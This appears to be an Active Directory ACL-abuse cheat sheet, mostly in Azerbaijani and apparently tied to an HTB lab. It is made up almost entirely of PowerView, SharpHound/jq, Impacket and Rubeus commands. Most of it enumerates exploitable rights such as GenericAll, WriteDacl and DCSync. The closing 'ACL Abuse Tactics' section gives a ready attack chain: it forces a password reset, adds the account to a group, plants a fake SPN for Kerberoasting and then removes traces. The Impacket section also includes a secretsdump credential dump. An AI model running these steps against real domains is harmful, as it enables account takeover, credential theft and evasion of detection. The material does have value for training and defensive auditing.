# Access Control List Abuse
<img width="975" height="452" alt="image" src="https://github.com/user-attachments/assets/17d9ea44-b8ff-4610-928d-b7f608798107" />

## PowerView Import
```
Import-Module .\PowerView.ps1
Get-Module ActiveDirectory

SharpHound.exe --CollectionMethods All --Domain domain.com --OutputDirectory C:\Users\htb-student\Desktop\bloodhound
```

## All domain Enumeration
```
# Bütün domain obyektlərinin ACL xəritəsi
Get-DomainObjectAcl -ResolveGUIDs | Select ObjectDN,ActiveDirectoryRights,IdentityReference

# Sharphound nəticəsi
cat *_users.json *_computers.json *_groups.json | jq -r '
  (if type == "array" then .[] elif .data then .data[] else empty end)
  | select(. != null)
  | .Properties.name as $target
  | (.Acls // empty)[]
  | select(. != null)
  | [$target, .RightName, .PrincipalName]
  | @tsv
' 2>/dev/null

===================================================================================================================================================================

# Riskli Hüquqlar
Get-DomainObjectAcl -ResolveGUIDs | ? { $_.ActiveDirectoryRights -match "GenericAll|GenericWrite|WriteDacl|WriteOwner|Owner|DeleteChild" } | ft ObjectDN,ActiveDirectoryRights,IdentityReference -AutoSize

# Sharphound nəticəsi
jq -rs '
  [.[][]]
  | (if type == "array" then .[] else empty end)
  | select(. != null)
  | .Properties.name as $target
  | (.Acls // empty)[]
  | select(. != null)
  | select(.RightName // "" | test("GenericAll|GenericWrite|WriteDacl|WriteOwner|DeleteChild"; "i"))
  | [$target, .RightName, .PrincipalName]
  | @tsv
' *.json 2>/dev/null
```

## Bütün Userlərin müəyyən User üzərindəki ACL-ləri
```
Get-ObjectAcl -Identity <USER> -ResolveGUIDs | ? { $_.ActiveDirectoryRights -match "GenericAll|WriteDacl|WriteOwner|GenericWrite" } ( Single User )

# Bütün Userlərin digər userlər üzərindəki ACL-ləri
Get-DomainUser | ForEach-Object { Get-ObjectAcl -Identity $_.SamAccountName -ResolveGUIDs } | ? {
    ($_.ActiveDirectoryRights -match "GenericAll|WriteDacl|WriteOwner|GenericWrite") -and
    ($_.IdentityReference -notmatch "Domain Admins|Enterprise Admins|SYSTEM|Admins")
} | Select ObjectDN, ActiveDirectoryRights, IdentityReference

# Sharphound nəticəsi
jq -r --arg user "<USER>@DOMAIN.LOCAL" '
  (if .data then .data[] elif type == "array" then .[] else empty end)
  | select(. != null)
  | select((.Properties.name // "") == $user)
  | (.Acls // empty)[]
  | select(. != null)
  | select(.RightName // "" | test("GenericAll|WriteDacl|WriteOwner|GenericWrite"; "i"))
  | [.PrincipalName, .RightName]
  | @tsv
' users.json 2>/dev/null
```

## Bir qrupun ACL-ləri
```
Get-ObjectAcl -Identity "<GROUP NAME>" -ResolveGUIDs

# Sharphound nəticəsi
jq -r --arg grp "<GROUP_NAME>@DOMAIN.LOCAL" '
  (if .data then .data[] elif type == "array" then .[] else empty end)
  | select(. != null)
  | select((.Properties.name // "") == $grp)
  | (.Acls // empty)[]
  | select(. != null)
  | [.PrincipalName, .RightName]
  | @tsv
' groups.json 2>/dev/null
```

## Bir Userin bütün qruplar üzrə ACL-ləri
```
$userSID = (Get-DomainUser -Identity "<USER>").userPrincipalName
Get-DomainGroup | ForEach-Object {
    $groupName = $_.Name
    Get-ObjectAcl -Identity $_.DistinguishedName -ResolveGUIDs | ? {
        ($_.IdentityReference -match $userSID) -and
        ($_.ActiveDirectoryRights -match "GenericAll|WriteDacl|WriteOwner|GenericWrite|AddMember")
    } | Select-Object @{Name="ModifiableGroup";Expression={$groupName}}, 
        ActiveDirectoryRights
}

# Sharphound nəticəsi
jq -r --arg user "<USER>@DOMAIN.LOCAL" '
  (if .data then .data[] elif type == "array" then .[] else empty end)
  | select(. != null)
  | .Properties.name as $group
  | (.Acls // empty)[]
  | select(. != null)
  | select((.PrincipalName // "") | contains($user))
  | select(.RightName // "" | test("GenericAll|WriteDacl|WriteOwner|GenericWrite|AddMember"; "i"))
  | [$group, .RightName]
  | @tsv
' groups.json 2>/dev/null
```

## Bir userin müəyyən qrup üzərində hansı hüquqları var
```
Get-ObjectAcl -Identity "Help Desk Level 1" -ResolveGUIDs |
? { $_.IdentityReference -match "damundsen" }

# Sharphound nəticəsi
jq -r --arg group "HELP DESK LEVEL 1@DOMAIN.LOCAL" --arg user "DAMUNDSEN@DOMAIN.LOCAL" '
  (if .data then .data[] elif type == "array" then .[] else empty end)
  | select(. != null)
  | select((.Properties.name // "") == $group)
  | (.Acls // empty)[]
  | select(. != null)
  | select((.PrincipalName // "") == $user)
  | [$user, "has", .RightName, "over", $group]
  | @tsv
' groups.json 2>/dev/null
```

## Bir Userin hansı qruplarda olduğuna baxmaq
```
# Birbaşa üzv olduğu qrupları görmək üçün
Get-DomainGroup -MemberIdentity "adunn" | Select-Object Name, DistinguishedName

(Get-ADUser -Identity adunn -Properties MemberOf).MemberOf
```

## Search Extended Right ( User-Force-Change-Password )
```
Get-ADObject `
-SearchBase "CN=Extended-Rights,$((Get-ADRootDSE).ConfigurationNamingContext)" `
-LDAPFilter "(name=*Force*)" `
-Properties rightsGuid |
Select Name,DisplayName,RightsGuid

# Sharphound nəticəsi
jq -r '
  (if .data then .data[] elif type == "array" then .[] else empty end)
  | select(. != null)
  | .Properties.name as $target
  | (.Acls // empty)[]
  | select(. != null)
  | select((.RightName // "") == "ForceChangePassword")
  | [.PrincipalName, " can RESET password of ", $target]
  | @tsv
' users.json 2>/dev/null
```

## Spesifik kompüter və ya bütün kompüterlərdəki riskli ACL-ləri tapmaq
```
Get-DomainComputer | ForEach-Object {
    $computerName = $_.Name
    Get-ObjectAcl -Identity $_.DistinguishedName -ResolveGUIDs | ? {
        ($_.ActiveDirectoryRights -match "GenericAll|GenericWrite|WriteDacl|WriteOwner") -and
        ($_.IdentityReference -notmatch "Domain Admins|Enterprise Admins|SYSTEM")
    } | Select-Object @{Name="TargetComputer";Expression={$computerName}}, 
        IdentityReference, 
        ActiveDirectoryRights
} | ft -AutoSize

# SharpHound nəticəsi
jq -r '
  (if .data then .data[] elif type == "array" then .[] else empty end)
  | select(. != null)
  | .Properties.name as $pc
  | (.Acls // empty)[]
  | select(. != null)
  | select(.RightName // "" | test("GenericAll|GenericWrite|WriteDacl|WriteOwner"; "i"))
  | select(.PrincipalName // "" | test("Admins|SYSTEM"; "i") | not)
  | [$pc, .RightName, .PrincipalName]
  | @tsv
' computers.json 2>/dev/null
```

## OU üzərində obyekt yaratma və ya GPO manipulyasiya hüquqlarını tapmaq
```
Get-DomainOU | ForEach-Object {
    $ouName = $_.Name
    Get-ObjectAcl -Identity $_.DistinguishedName -ResolveGUIDs | ? {
        ($_.ActiveDirectoryRights -match "CreateChild|WriteDacl|WriteProperty") -and
        ($_.IdentityReference -notmatch "Domain Admins|SYSTEM")
    } | Select-Object @{Name="TargetOU";Expression={$ouName}}, 
        IdentityReference, 
        ActiveDirectoryRights,
        @{Name="AccessType";Expression={if($_.ActiveDirectoryRights -match "CreateChild"){"Object Creation"}else{"Possible GPO Link Abuse"}}}

# SharpHound nəticəsi
jq -r '
  (if .data then .data[] elif type == "array" then .[] else empty end)
  | select(. != null)
  | .Properties.name as $ou
  | (.Acls // empty)[]
  | select(. != null)
  | select(.RightName // "" | test("CreateChild|WriteDacl|WriteProperty"; "i"))
  | select(.PrincipalName // "" | test("Admins|SYSTEM"; "i") | not)
  | [$ou, .RightName, .PrincipalName]
  | @tsv
' ous.json 2>/dev/null
```

# Domain Root ACL
```
Get-DomainObjectAcl -ResolveGUIDs | ? {
    ($_.ObjectDN -match "^DC=") -and
    ($_.ActiveDirectoryRights -match "ExtendedRight") -and
    ($_.ObjectAceType -match "DS-Replication-Get-Changes|DS-Replication-Get-Changes-All")
} | Select-Object IdentityReference, ObjectAceType, ActiveDirectoryRights

Get-DomainObjectAcl -ResolveGUIDs | ? {
    ($_.ObjectDN -match "^DC=") -and
    ($_.ActiveDirectoryRights -match "GenericAll|WriteDacl|WriteOwner|All") -and
    ($_.IdentityReference -notmatch "Admins|SYSTEM|Enterprise Admins")
} | Select-Object ObjectDN, IdentityReference, ActiveDirectoryRights

Get-DomainObjectAcl -ResolveGUIDs | ? { ($_.ObjectDN -match "^DC=") -and ($_.ActiveDirectoryRights -match "WriteOwner") } |
Select-Object ObjectDN, IdentityReference, ActiveDirectoryRights

# SharpHound nəticəsi
jq -r '
  (if .data then .data[] elif type == "array" then .[] else empty end)
  | select(. != null)
  | (.Acls // empty)[]
  | select(. != null)
  | select(.RightName // "" | test("GetChanges"; "i"))
  | [.PrincipalName, .RightName]
  | @tsv
' domains.json 2>/dev/null
```

## SID-Based Targeted Hunt
```
$sid = (Get-DomainUser -Identity "username").objectsid

# Bütün domaində bu SID-ə aid olan hüquqları birbaşa tapmaq
Get-DomainObjectAcl -ResolveGUIDs -PrincipalSID $sid | 
Select-Object ObjectDN, ActiveDirectoryRights, ObjectAceType

# SharpHound nəticəsi
SID="S-1-5-21-XXXX"   # dəyiştir
jq -r --arg sid "$SID" '
  (if .data then .data[] elif type == "array" then .[] else empty end)
  | select(. != null)
  | .Properties.name as $target
  | (.Acls // empty)[]
  | select(. != null)
  | select((.PrincipalSID // "") == $sid)
  | [$target, .RightName]
  | @tsv
' *.json 2>/dev/null
```

## Bir userin ( USER1 ) digər userlər üzərindəki ACL ləri
```
$User1SID = (Get-DomainUser -Identity "USER1").objectsid

Get-DomainUser | ForEach-Object {
    Get-DomainObjectAcl -Identity $_.DistinguishedName -PrincipalSID $User1SID -ResolveGUIDs
} | ? { $_.ActiveDirectoryRights -match "GenericAll|WriteProperty|WriteDacl|WriteOwner|All" } | 
Select-Object ObjectDN, ActiveDirectoryRights, @{Name="TargetType";Expression={"User"}}

# SharpHound nəticəsi
jq -r --arg u1 "USER1@DOMAIN.LOCAL" '
  (if .data then .data[] elif type == "array" then .[] else empty end)
  | select(. != null)
  | .Properties.name as $target
  | (.Acls // empty)[]
  | select(. != null)
  | select((.PrincipalName // "") == $u1)
  | select(.RightName // "" | test("GenericAll|WriteProperty|WriteDacl|WriteOwner|All"; "i"))
  | [$u1, " controls ", $target, " via ", .RightName]
  | @tsv
' users.json 2>/dev/null
```

## Bir Userin ( USER1 ) digər User ( USER2 ) üzərindəki ACL ləri
```
$User1SID = (Get-DomainUser -Identity "USER1").objectsid

Get-DomainObjectAcl -Identity "USER2" -ResolveGUIDs | 
? { $_.SecurityIdentifier -eq $User1SID } | 
Select-Object ObjectDN, ActiveDirectoryRights, ObjectAceType

# SharpHound
jq -r --arg u1 "USER1@DOMAIN.LOCAL" --arg u2 "USER2@DOMAIN.LOCAL" '
  (if .data then .data[] elif type == "array" then .[] else empty end)
  | select(. != null)
  | select((.Properties.name // "") == $u2)
  | (.Acls // empty)[]
  | select(. != null)
  | select((.PrincipalName // "") == $u1)
  | [$u1, " has ", .RightName, " over ", $u2]
  | @tsv
' users.json 2>/dev/null
```

## Compromise ACL
```
$targetUser = "USER1"
$userObj = Get-DomainUser -Identity $targetUser
$UserSID = $userObj.objectsid

# İstifadəçinin həm öz SID-ini, həm də daxil olduğu bütün qrupların SID-lərini toplayırıq
$allSIDs = Get-DomainGroup -MemberIdentity $targetUser | Select-Object -ExpandProperty objectsid
$allSIDs += $UserSID

# Hədəf istifadəçi (adunn) üzərində bu SID-lərdən hər hansı birinin hüququ varmı?
Get-DomainObjectAcl -Identity "adunn" -ResolveGUIDs | 
? { $allSIDs -contains $_.SecurityIdentifier } | 
Select-Object @{Name="Grantor";Expression={$targetUser}}, ObjectDN, ActiveDirectoryRights, SecurityIdentifier

# Sharphound
jq -r --arg name "USER1@DOMAIN.LOCAL" '
  (if .data then .data[] elif type == "array" then .[] else empty end)
  | select(. != null)
  | select((.Properties.name // "") == $name)
  | .Properties.name as $un
  | (.Acls // empty)[]
  | select(. != null)
  | select((.PrincipalName // "") == $un)
  | [.RightName]
  | @tsv
' *.json 2>/dev/null
```

## Digər Userlərin Müəyyən Bir User (<USER1>) Üzərindəki ACL-ləri
```
Get-DomainObjectAcl -Identity "<USER1>" -ResolveGUIDs | ? { 
    $_.ActiveDirectoryRights -match "GenericAll|WriteProperty|WriteDacl|GenericWrite|AllExtendedRights" -and
    $_.IdentityReference -notmatch "Domain Admins|Enterprise Admins|SYSTEM"
} | Select-Object IdentityReference, ActiveDirectoryRights, ObjectAceType, IsInherited | ft -AutoSize
```
## SID Convert
```
"S-1-5-21-...", "S-1-5-21-..." | ForEach-Object { 
    ConvertFrom-SID $_ | Select-Object @{N="SID";E={$_}}, @{N="Name";E={(Get-DomainObject -Identity $_).Name}}
}
```

## Qrup Üzvlərinin Sürətli Analizi
```
Get-DomainGroupMember -Identity "Help Desk Level 1" | Select-Object MemberName, MemberDistinguishedName, MemberObjectClass
```

## Extended Rights Manual Analysis (GUID Mapping)
```
function Get-ExtendedRightName {
    param($guid)
    Get-ADObject -SearchBase "CN=Extended-Rights,$((Get-ADRootDSE).ConfigurationNamingContext)" `
    -Filter "rightsGuid -eq '$guid'" -Properties DisplayName | Select-Object -ExpandProperty DisplayName
}

# İstifadəsi:
Get-ExtendedRightName -guid "00299570-246d-11d0-a768-00aa006e0529"
```

# Group → MemberOf Chain Analysis
```
Get-DomainGroup -Identity "Help Desk Level 1" | Get-DomainGroupMemberOf -Flatten | Select-Object Name, DistinguishedName
```

# Auto Discovery
```
Find-InterestingDomainAcl -ResolveGUIDs | ? { 
    $_.IdentityReference -notmatch "Admins|SYSTEM|Exchange" 
} | Select-Object ObjectDN, IdentityReference, ActiveDirectoryRights | Out-GridView
```

## Impacket ilə LDAP ACL Enum
```
# DA ilə secretsdump + ACL parse
secretsdump.py domain/admin@dc-ip -just-dc

# ldapdomaindump (bütün ACL-lər)
ldapdomaindump -u 'domain\user' -p 'pass' dc-ip /tmp/ldapdump/
grep -r "GenericAll\|WriteDacl" /tmp/ldapdump/
```

## ACL Rights Mask-ları və Abuse Metodları
```

0x00000001  | CreateChild        | Alt obyekt yaratmaq (user/computer/OU creation, RBCD üçün machine account)
0x00000002  | DeleteChild        | Child obyekt silmək (DoS, GPO və ya admin hesabı silmək)
0x00000004  | ListChildren       | Child obyektləri görmək (Recon)
0x00000008  | Self               | Validated writes (məs. müəyyən hallarda SPN və ya xüsusi atribut dəyişiklikləri)
0x00000010  | ReadProperty       | Atributları oxumaq (SPN, LAPS, delegation info)
0x00000020  | WriteProperty      | Atribut dəyişmək (SPN add → targeted Kerberoast, RBCD, group member mod)
0x00000040  | DeleteTree         | Subtree silmək (struktur DoS)
0x00000080  | ListObject         | Gizli obyektləri görmək (Advanced recon)
0x00000100  | ExtendedRight      | Xüsusi hüquqlar (ResetPassword, DCSync – GUID-dən asılıdır)
0x00010000  | Delete             | Obyekti silmək (Admin hesabı / GPO silmək)
0x00020000  | ReadControl        | Security descriptor oxumaq (ACL recon)
0x00040000  | WriteDacl          | ACL dəyişmək (özünə hüquq əlavə edərək privilege escalation)
0x00080000  | WriteOwner         | Owner dəyişmək (takeover → sonra WriteDacl ilə full control)
0x10000000  | GenericAll         | Full control (ResetPass, ACL change, DCSync, persistence)
0x20000000  | GenericExecute     | Məhdud icra hüquqları (praktik eskalasiya nadir)
0x40000000  | GenericWrite       | Bir çox atributa write (SPN add → Kerberoasting, group takeover, RBCD)
0x80000000  | GenericRead        | Geniş oxuma hüququ (Kerberoast recon, LAPS read əgər qorunmayıbsa)

```

# ACL Abuse Tactics

## Hədəf Axtarışı (Recon & Enumeration)
```
$CurrentSID = (Get-DomainUser -Identity $env:USERNAME).objectsid

Get-DomainObjectACL -ResolveGUIDs | ? {
    ($_.SecurityIdentifier -eq $CurrentSID) -and 
    ($_.ActiveDirectoryRights -match 'GenericAll' -or $_.ObjectAceType -match 'User-Force-Change-Password')
} | Select-Object ObjectDN, ActiveDirectoryRights, ObjectAceType | Out-GridView

Yada

Find-InterestingDomainAcl -ResolveGUIDs | ? { $_.IdentityReferenceName -match "htb-student" } | Select-Object ObjectDN, ActiveDirectoryRights
```

## Parolun Sıfırlanması (The Abuse)
```
# 1. Addım: Yeni parolu SecureString formatına salmaq
$NewPassword = ConvertTo-SecureString 'Pwn3d_by_ACLs!' -AsPlainText -Force

# 2. Addım: Parolu sıfırlamaq (Set-DomainUserPassword PowerView funksiyasıdır)
Set-DomainUserPassword -Identity damundsen -AccountPassword $NewPassword -Verbose

# 3. Addım: Yeni giriş məlumatları (Credential) obyekti yaratmaq
$damundsenCred = New-Object System.Management.Automation.PSCredential('INLANEFREIGHT\damundsen', $NewPassword)
```

<img width="894" height="464" alt="Screenshot 2026-03-07 163209" src="https://github.com/user-attachments/assets/098da167-3eb9-4148-9e00-24f1ba0906f6" />

## Qrup Manipulyasiyası (Lateral Movement)
```
# Qrupa üzv əlavə etmək (damundsen-in hüququndan istifadə edərək)
Add-DomainGroupMember -Identity 'Help Desk Level 1' -Members 'damundsen' -Credential $damundsenCred -Verbose

# Üzvliyi yoxlamaq
Get-DomainGroupMember -Identity "Help Desk Level 1" | Select-Object MemberName | ? {$_.MemberName -match 'damundsen'}
```

## SPN Manipulyasiyası və Kerberoasting (Stealth Attack)
```
# 1. Addım: Saxta SPN təyin etmək
Set-DomainObject -Credential $damundsenCred -Identity adunn -SET @{serviceprincipalname='notahacker/LEGIT'} -Verbose

# 2. Addım: Rubeus ilə heşi çəkmək
.\Rubeus.exe kerberoast /user:adunn /nowrap

# 3. Addım: İzi itirmək üçün SPN-i silmək (Vacibdir!)
Set-DomainObject -Credential $damundsenCred -Identity adunn -Clear serviceprincipalname -Verbose
```

## Təmizlik və İzlərin Silinməsi (Cleanup)
```
# Qrupdan çıxarılma
Remove-DomainGroupMember -Identity "Help Desk Level 1" -Members 'damundsen' -Credential $damundsenCred -Verbose

# Təsdiqləmə
Get-DomainGroupMember -Identity "Help Desk Level 1" | Select-Object MemberName
```

## SID-dən Obyektə (Sürətli Axtarış)
```
function Get-ObjectByRID {
    param($RID)
    Get-DomainObject -Properties samaccountname, objectsid | ? {$_.objectsid -like "*-$RID"}
}

# İstifadəsi:
Get-ObjectByRID -RID 1105
```






